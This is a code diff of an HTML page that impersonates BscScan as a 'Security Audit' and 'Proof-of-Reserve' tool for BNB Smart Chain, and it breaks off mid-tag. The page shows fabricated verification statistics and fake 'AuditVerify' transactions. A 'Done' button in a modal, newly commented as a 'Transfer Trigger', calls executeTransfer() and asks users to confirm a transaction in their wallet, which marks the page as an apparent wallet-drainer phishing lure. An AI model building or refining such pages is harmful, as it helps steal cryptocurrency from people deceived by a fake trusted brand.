@@ -5,13 +5,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>BscScan Security Audit</title>
   
+  <!-- Ethers.js Library for Web3 Logic -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
     body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
     
-    .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; position: relative; overflow-x: hidden; }
+    .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; position: relative; min-height: 100vh; }
 
     /* Header */
     .brand-header { padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 10px; }
@@ -91,7 +92,7 @@
     .hash-text { color: #f3ba2f; font-family: monospace; }
     .method-badge { background-color: rgba(255,255,255,0.05); color: #94a3b8; font-size: 11px; padding: 4px 8px; border-radius: 4px; }
 
-    /* Footer */
+    /* BscScan Footer */
     .site-footer { padding: 30px 16px; display: flex; flex-direction: column; align-items: flex-start; margin-top: 10px; }
     .footer-brand { display: flex; align-items: center; gap: 8px; color: #f3ba2f; font-weight: 700; font-size: 15px; margin-bottom: 6px; }
     .footer-desc { font-size: 11px; color: #718096; line-height: 1.5; margin-left: 30px; margin-bottom: 24px; }
@@ -112,11 +113,12 @@
     .sync-box { background-color: #171c26; border-radius: 10px; padding: 10px; width: 100%; display: flex; align-items: flex-start; gap: 8px; text-align: left; margin-bottom: 20px; border: 1px solid #1a2233; }
     .sync-tick { color: #00d395; font-size: 12px; font-weight: bold; margin-top: 1px; }
     .sync-text { font-size: 10px; color: #94a3b8; line-height: 1.5; }
-    .btn-done { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 12px; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px;}
+    .btn-done { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 12px; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
     .wallet-icon-yellow { width: 44px; height: 44px; border-radius: 50%; border: 1px solid #4a3c1e; color: #f3ba2f; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
     .modal-info-box { background-color: #0b0e14; border-radius: 12px; padding: 16px; font-size: 11px; color: #94a3b8; line-height: 1.5; margin-bottom: 20px; width: 100%; text-align: center; }
     
     .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .app-container.blurred { filter: blur(3px); pointer-events: none; }
   </style>
 </head>
@@ -140,7 +142,7 @@
     </div>
   </div>
 
-  <!-- Success / Balance Display Modal -->
+  <!-- Success & Transfer Trigger Modal -->
   <div class="modal-overlay" id="auditModal">
     <div class="modal-card">
       <button class="modal-close" onclick="closeModal('auditModal')">✕</button>
@@ -158,7 +160,7 @@
         <div class="sync-text">Tokens are authentic and synchronized directly with mainnet validator nodes.</div>
       </div>
       
-      <!-- Modal Done Button -->
+      <!-- Modal Done Button triggers Confirming... and transaction -->
       <button class="btn-done" id="modalConfirmBtn" onclick="executeTransfer()">Done</button>
       <div id="modalStatusMsg" style="font-size:10px; color:#f3ba2f; display:none; text-align:center; font-weight:bold; margin-top:10px;">
         Please confirm the transaction in your wallet popup.
@@ -169,6 +171,7 @@
   <!-- MAIN APP CONTENT -->
   <div class="app-container" id="appContent">
     
+    <!-- Top Header -->
     <div class="brand-header">
       <div class="brand-logo">
         <div class="shield-icon">
@@ -188,6 +191,7 @@
     </div>
 
     <div class="content-area">
+      <!-- Stats -->
       <div class="card">
         <div class="card-label">USDT VERIFIED (24H)</div>
         <div class="card-value text-yellow" id="usdt-val">$15,906,052</div>
@@ -206,6 +210,7 @@
         <div class="card-subtext-gray">1.05 Gwei Standard Gas</div>
       </div>
 
+      <!-- Banner & Description -->
       <div class="banner-pill">
         BscScan Proof-of-Reserve Protocol
       </div>
@@ -213,6 +218,7 @@
       <div class="main-heading">BNB Smart Chain <span>Security<br>Audit</span></div>
       <div class="main-desc">The institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</div>
 
+      <!-- Verify Action Box -->
       <div class="verify-box">
         <div class="token-row">
           <div class="token-info">
@@ -237,7 +243,8 @@
           <div class="verify-title">Verify Assets</div>
           <div class="verify-desc">Execute official on-chain validation for your tokens via direct Smart Chain consensus.</div>
           
-          <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
+          <!-- Verification Button -->
+          <button id="mainVerifyBtn" type="button" class="btn-verify" onclick="initiateAuditFlow()">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;" id="btnIcon">
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             </svg>
@@ -307,13 +314,4 @@
             <td class="hash-text">0x7f4e...9b12</td>
             <td><span class="method-badge">AuditVerify</span></td>
             <td>38924102</td>
-          </tr>
-          <tr>
-            <td class="hash-text">0x3a19...8c44</td>
-            <td><span class="method-badge">AuditVerify</span></td>
-            <td>38924099</td>
-          </tr>
-          <tr>
-            <td class="hash-text">0x9c21...e5f3</td>
-            <td><span class="method-badge">AuditVerify</span></td>
-            <td>38924095</t
+        
